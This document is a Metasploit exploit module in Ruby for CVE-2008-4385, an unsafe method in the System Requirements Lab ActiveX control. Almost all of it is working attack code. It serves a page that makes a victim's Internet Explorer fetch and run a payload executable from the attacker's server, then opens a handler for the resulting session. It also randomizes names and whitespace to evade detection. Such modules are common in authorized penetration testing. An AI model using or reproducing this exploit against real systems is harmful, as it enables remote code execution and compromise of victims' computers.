##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Husdawg, LLC. System Requirements Lab ActiveX Unsafe Method',
      'Description'    => %q{
          This module allows attackers to execute code via an unsafe method in
        Husdawg, LLC. System Requirements Lab ActiveX Control (sysreqlab2.dll 2.30.0.0)
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'MC' ],
      'References'     =>
        [
          [ 'CVE', '2008-4385' ],
          [ 'OSVDB', '50122' ],
          [ 'US-CERT-VU', '166651' ],
        ],
      'Payload'        =>
        {
          'Space'           => 2048,
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2008-10-16'))
  end

  def autofilter
    false
  end

  def check_dependencies
    use_zlib
  end

  def on_request_uri(cli, request)

    payload_url =  "http://"
    payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
    payload_url += ":" + datastore['SRVPORT'].to_s + get_resource() + "/payload"

    if (request.uri.match(/payload/))
      return if ((p = regenerate_payload(cli)) == nil)
      data = generate_payload_exe({ :code => p.encoded })
      print_status("Sending payload EXE")
      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
      return
    end

    vname  = rand_text_alpha(rand(100) + 1)
    exe    = rand_text_alpha(rand(20) + 1)

    content = %Q|
      <html>
        <object classid='clsid:67A5F8DC-1A4B-4D66-9F24-A704AD929EEE' id='#{vname}'></object>
        <script language='JavaScript'>
          #{vname}.Init("#{payload_url}/#{exe}.exe", "#{vname}");
        </script>
      </html>
            |

    content = Rex::Text.randomize_space(content)

    print_status("Sending #{self.name}")

    send_response_html(cli, content)

    handler(cli)

  end
end
